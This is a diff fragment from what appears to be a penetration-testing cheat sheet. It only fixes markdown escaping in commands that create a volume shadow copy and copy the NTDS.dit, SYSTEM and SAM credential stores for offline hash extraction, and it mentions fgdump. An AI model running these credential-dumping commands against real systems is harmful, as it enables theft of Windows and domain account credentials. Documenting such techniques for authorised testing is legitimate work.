@@ -27,11 +27,11 @@ Run fgdump to dump local hash
 
 > `cscript vssown.vbs /create`
 
-> `copy \\?GLOBALROOT\Device\HarddiskVolumeShadowCopy\[X\]\Windows\NTDS\NTDS.dit c:\`
+> `copy \\?GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\Windows\NTDS\NTDS.dit c:\`
 
-> `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy\[X\]\Windows\System32\config\SYSTEM c:\`
+> `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\Windows\System32\config\SYSTEM c:\`
 
-> `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy\[X\]\Windows\System32\SAM c:\`
+> `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\Windows\System32\SAM c:\`
 
 ### Hash identification
 
